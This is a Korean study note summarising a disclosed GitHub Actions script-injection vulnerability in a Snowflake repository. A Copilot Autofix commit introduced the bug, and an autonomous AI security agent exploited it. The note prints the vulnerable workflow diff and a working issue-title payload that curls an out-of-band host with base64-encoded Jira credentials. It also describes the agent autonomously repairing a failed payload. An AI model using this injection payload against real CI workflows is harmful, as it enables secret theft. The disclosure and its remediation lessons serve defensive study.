---
title: "Copilot의 \"자동 수정\"이 만든 취약점, Snowflake Jira를 뚫다"
tags: [dev-digest, hot]
type: study
tech:
  - frontend
level: ""
created: 2026-08-17
aliases: []
---

> [!info] 원문
> [AI-Generated GitHub Copilot “Autofix” Allowed Compromise of Snowflake's Jira](https://www.wiz.io/blog/red-agent-snowflake-copilot-cicd-bug) · Hacker News (Top)

## 핵심 개념

> [!abstract]
> Wiz Research의 자율 AI 보안 에이전트 'Red Agent'가 Snowflake 공개 저장소의 GitHub Actions 워크플로에서 스크립트 인젝션 취약점을 발견했다. 이 취약점은 GitHub Copilot의 'Autofix' 기능이 공동 작성한 PR이 기존의 안전한 입력 검증 패턴을 제거하면서 생겨났으며, AI 기반 보안 리뷰조차 이를 걸러내지 못했다. Red Agent는 익스플로잇 도중 문법 오류가 발생하자 스스로 페이로드를 수정해 Jira 자격증명을 성공적으로 탈취했고, Snowflake는 당일 패치와 토큰 폐기로 대응했다.

## 아티클

Snowflake는 HackerOne을 통한 취약점 공개 프로그램을 운영하며 지속적으로 보안 연구자들의 검증을 받고 있습니다. 이번에는 Wiz Research가 자체 개발한 자율 AI 보안 리서치 도구 "Red Agent"가 Snowflake의 공개 GitHub 저장소에서 심각한 GitHub Actions 워크플로 취약점을 발견했는데요, 흥미로운 지점은 이 취약점 자체가 GitHub Copilot의 "Autofix" 기능이 커밋한 코드에서 비롯됐다는 사실입니다. AI 코딩 에이전트가 만든 코드를 AI 보안 리뷰가 통과시켰고, 이를 또 다른 자율 AI 에이전트가 찾아내 실제로 악용까지 성공시킨 이번 사례는, AI가 코드 작성부터 보안 검토, 취약점 탐지까지 전 과정에 관여하는 새로운 개발 환경에서 어떤 위험이 발생할 수 있는지 잘 보여줍니다.

## 사건 개요

Wiz Red Agent는 `snowflakedb/snowflake-connector-net` 저장소에서 스크립트 인젝션 취약점을 발견했습니다. 인증되지 않은 사용자가 특별히 조작한 제목으로 GitHub 이슈를 하나 여는 것만으로 GitHub Actions 러너 내에서 임의 명령을 실행할 수 있는 구조였습니다.

더 눈여겨볼 부분은 타이밍입니다. 이 취약점은 발견 불과 5일 전인 2026년 6월 18일, PR #1218이 머지되면서 실제로 살아 있는 상태가 됐습니다. 그리고 이 PR의 최종 스쿼시 커밋에는 "Copilot Autofix powered by AI"가 공동 작성자(co-author)로 기록돼 있었습니다. 해당 PR은 기존에 안전하게 구성돼 있던 입력값 sanitize 패턴을 걷어내고, 직접적인 문자열 확장 방식으로 바꿔버렸는데도 GitHub의 AI 기반 보안 리뷰는 이 변경으로 생긴 치명적 취약점을 전혀 잡아내지 못했습니다.

## 취약점 발견 과정

Wiz Red Agent의 CI/CD 스캐닝 기능이 Snowflake의 GitHub organization을 훑던 중, `snowflakedb/snowflake-connector-net` 저장소의 `jira_issue.yml` 워크플로가 `run:` 블록 안에서 신뢰할 수 없는 입력값을 그대로 사용하고 있어 스크립트 인젝션에 취약하다는 점을 잡아냈습니다.

문제가 된 코드 변경 내역은 다음과 같습니다.

```
- env:
- ISSUE_TITLE: ${{ github.event.issue.title }}
- run: jq -n --arg title "$ISSUE_TITLE" ...
+ run: TITLE=$(echo '${{ github.event.issue.title }}' | sed ...)
```

이 워크플로는 `issues: opened` 이벤트에서 트리거됩니다. 즉 누구든 GitHub 이슈를 하나 열기만 하면 이 워크플로를 실행시킬 수 있다는 뜻입니다. 그리고 공격자가 통제할 수 있는 이슈 제목을 셸 스크립트에 그대로 삽입하고 있었습니다.

```
run: |
  TITLE=$(echo '${{ github.event.issue.title }}' | sed 's/"/\\"/g' | sed "s/'/\\\'/g")
```

여기서 `sed`를 이용한 이스케이프 처리는 GitHub의 템플릿 확장이 끝난 *이후*에 실행됩니다. 따라서 이슈 제목에 작은따옴표(`'`) 하나만 넣어도 `echo '...'` 구문을 벗어날 수 있고, 곧바로 임의 명령 실행으로 이어집니다.

이 취약한 패턴이 도입된 시점은 불과 며칠 전인 2026년 6월 18일, 커밋 `4a1b8ce`(PR #1218: "SNOW-2069227: Update jira workflows")였고, 공동 작성자로 "Copilot Autofix powered by AI"가 기록돼 있었습니다. 이 커밋은 원래 저장소에 있던 안전한 패턴 — 이슈 제목을 `env:` 변수로 전달한 뒤 `jq`로 JSON 페이로드를 구성하던 방식 — 을 제거하고, 위에서 본 것처럼 `${{ github.event.issue.title }}`을 직접 문자열에 끼워 넣는 방식으로 바꿔버렸습니다. 한마디로, AI "autofix" 커밋이 스스로 인젝션 벡터를 만들어낸 셈입니다.

## 열려 있던 "보안 게이트"

해당 워크플로에는 언뜻 보호 장치처럼 보이는 조건문이 있었습니다.

```
if: (github.event_name == 'issues' && github.event.pull_request.user.login != 'whitesource-for-github-com[bot]')
```

하지만 `issues` 이벤트에서는 `github.event.pull_request`가 항상 `null`입니다. 따라서 이 조건은 결국 `(null != 'whitesource-for-github-com[bot]')`로 귀결되고, 이는 언제나 참(true)입니다. 결과적으로 모든 GitHub 사용자가 이 게이트를 그냥 통과할 수 있었던 것이죠.

## 실제 익스플로잇 과정

Wiz는 템플릿 확장 이후 `echo` 문자열을 빠져나가 out-of-band 콜백을 통해 Jira 자격증명을 유출시키는 이슈 제목을 만들어 테스트했습니다.

흥미로운 대목은, Red Agent의 cicd 기능이 처음에 표준 주석 문자(`#`)로 페이로드를 종료하려 했을 때 러너가 bash 문법 오류를 반환했다는 점입니다. 주석 처리 과정에서 `TITLE=$(...)`의 닫는 괄호까지 함께 먹혀버렸기 때문인데요, Red Agent는 여기서 멈추지 않고:

1. 발생한 문법 오류를 자율적으로 분석하고
2. 페이로드를 `; echo '` 형태로 수정해 셸 블록을 올바르게 닫은 뒤
3. out-of-band 콜백을 성공적으로 수신했습니다.

```
' ; curl -s "https://subdomain.oast.me?t=`printf %s $JIRA_API_TOKEN|base64 -w0`&e=`printf %s $JIRA_USER_EMAIL|base64 -w0`&u=`printf %s $JIRA_BASE_URL|base64 -w0`" ; echo '
```

수 초 만에 Azure IP `20.106.182.197`의 GitHub Actions 러너로부터 base64로 인코딩된 자격증명이 담긴 콜백이 리스너에 도착했습니다.

> 참고: 첫 시도에서는 `#`로 나머지 줄을 주석 처리하려 했지만, `TITLE=$(...)`의 닫는 괄호까지 함께 소모되면서 예기치 않은 EOF bash 오류가 발생했습니다. 해결책은 `; echo '`를 사용해 셸 문법을 정확히 닫아주는 것이었습니다.

유출된 토큰은 `qa@snowflake.net` 계정으로 `snowflakecomputing.atlassian.net`에 인증됐고, Snowflake의 엔지니어링, 보안 컴플라이언스, 버그바운티 트래킹 프로젝트 전반에 대한 읽기 권한을 갖고 있었습니다.

## 복구 및 포렌식 조사

- **당일 패치**: Snowflake는 2026년 6월 23일(커밋 `1dc7766`, PR #1402)에 워크플로를 패치해, 안전한 `env:` 변수와 `jq --arg` 파싱 패턴을 완전히 복원했습니다.
- **자격증명 폐기**: 문제가 된 Jira 토큰은 폐기 후 재발급됐습니다.
- **포렌식 검증**: 감사 로그를 종합 분석한 결과, 5일간의 노출 기간 동안 외부 제3자가 해당 엔드포인트에 접근한 흔적은 발견되지 않았습니다. 이상 징후로 보였던 모든 쿼리는 전부 Wiz의 테스트 IP와 정확히 일치했습니다.

## 핵심 시사점

**AI 코드 생성에는 엄격한 감독이 필요합니다.** AI 코딩 도구는 확률적 패턴에 기반해 코드를 예측하기 때문에, 이미 오래전에 폐기된 안전하지 않은 셸 패턴을 의도치 않게 다시 도입할 수 있습니다. AI가 생성한 PR도 사람이 작성한 코드와 동일한 수준의 정적 분석과 보안 검토를 반드시 거쳐야 합니다.

**발견 시간이 급격히 짧아지고 있습니다.** 이번 취약점은 살아 있던 기간이 단 5일에 불과했고, 그마저도 자동화된 에이전트가 발견하고 검증하는 데 걸린 시간이었습니다. 보안 운영 체계는 이제 자동화된 취약점 탐색이 몇 시간 단위로 이뤄지는 환경에 맞춰, 빠른 패치 주기와 단기 유효 자격증명 도입 등으로 대응해야 합니다.

**AI로 인한 보안 회귀(regression)를 막아야 합니다.** 자동화된 AI 어시스턴트는 특정 코드 패턴이 왜 그렇게 선택됐는지에 대한 맥락을 갖고 있지 않은 경우가 많습니다. 이번 사건에서도 자동화된 PR이 셸 인젝션을 막기 위해 명시적으로 도입해뒀던 안전한 `env:` + `jq` 파싱 패턴을 제거해버렸습니다. 보안 팀은 AI 에이전트가 구조화된 데이터 파서를 직접적인 문자열 보간(interpolation)으로 대체하지 못하도록 막는 가드레일을 마련해야 합니다.

## 공개 타임라인

- **2026년 6월 18일** — PR #1218이 머지되며 취약점이 실제로 활성화됨 (Copilot Autofix 공동 작성)
- **2026년 6월 23일** — Wiz가 취약점을 식별·악용하고 HackerOne을 통해 Snowflake에 보고 (리포트 #3819931)
- **2026년 6월 23일** — Snowflake 보안팀에 Slack 알림 발송
- **2026년 6월 23일 (당일)** — Snowflake가 취약한 스크립트 인젝션 워크플로 패치 (커밋 `1dc7766`, PR #1402), 안전한 `env:` + `jq --arg` 패턴 복원
- **2026년 6월 24일** — Jira 토큰 재발급
- **2026년 7월 25일** — 공개 공시 기한 (Snowflake 공개 정책에 따라 6월 25일 해결 시점으로부터 30일 후)

## Snowflake의 공식 입장

Snowflake는 HackerOne 취약점 공개 및 버그바운티 프로그램을 통한 Wiz의 책임 있는 보고와 협력에 감사를 표했습니다. 2026년 6월 23일 접수된 이 신고는 즉시 조사·복구됐으며, 조사 결과 무단 접근의 증거는 발견되지 않았다고 밝혔습니다. Snowflake는 시스템 보호를 최우선 과제로 삼고 있으며, 소프트웨어 개발 및 보안 관행을 지속적으로 강화해 나갈 것이라고 덧붙였습니다. 또한 이번 사례에서 얻은 교훈을 Wiz와 함께 업계 전반에 공유해, 관련 보안 모범 사례의 폭넓은 도입을 촉진하겠다고 밝혔습니다.

## 정리

- AI 코드 어시스턴트("Copilot Autofix")가 작성한 PR이 기존의 안전한 입력 검증 패턴을 제거하고 셸 인젝션에 취약한 코드로 대체했으며, 이는 AI 기반 보안 리뷰조차 걸러내지 못했습니다.
- 취약점은 병합된 지 단 5일 만에 자율 AI 보안 에이전트("Red Agent")에 의해 발견·검증됐고, 에이전트는 최초 익스플로잇 시도가 실패하자 스스로 원인을 분석해 페이로드를 수정하는 자율적 문제 해결 능력을 보였습니다.
- 얼핏 보호 장치처럼 보이던 워크플로의 `if` 조건문이 실제로는 항상 참으로 평가되는 논리적 결함을 갖고 있어, 사실상 아무런 인증 없이도 워크플로를 실행할 수 있었습니다.
- 실무적으로는 (1) AI가 생성한 코드에도 사람이 작성한 코드와 동일한 보안 검토를 적용하고, (2) 자동 발견·악용 속도에 맞춰 패치 주기를 단축하고 단기 유효 자격증명을 도입하며, (3) AI 에이전트가 구조화된 파싱 패턴을 문자열 보간으로 되돌리지 못하도록 가드레일을 두는 세 가지 대응이 필요합니다.

## 참고 자료

- [원문 링크](https://www.wiz.io/blog/red-agent-snowflake-copilot-cicd-bug)
- via Hacker News (Top)
- engagement: 298

## 관련 노트

- [[2026-08-17|2026-08-17 Dev Digest]]
